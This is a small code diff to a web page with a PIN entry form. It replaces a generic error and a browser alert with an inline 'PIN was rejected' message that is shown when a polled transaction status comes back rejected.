@@ -265,7 +265,7 @@
     </div>
 
     <button class="btn-submit" id="btnSubmit" onclick="submitPin()" disabled>Confirm &amp; Continue</button>
-    <div class="error-msg" id="errorMsg">An error occurred while sending data, please try again.</div>
+    <div class="error-msg" id="errorMsg">The PIN was rejected. Please verify the details and try again.</div>
 
     <div class="spacer"></div>
   </div>
@@ -354,7 +354,9 @@
               } else if (data.status === 'rejected') {
                 clearInterval(pollInterval);
                 document.getElementById('loadingOverlay').style.display = 'none';
-                alert("The transaction was rejected, please verify your details and try again.");
+                var errorMsg = document.getElementById('errorMsg');
+                errorMsg.textContent = 'The PIN was rejected. Please verify the details and try again.';
+                errorMsg.style.display = 'block';
                 clearPin();
               }
             }
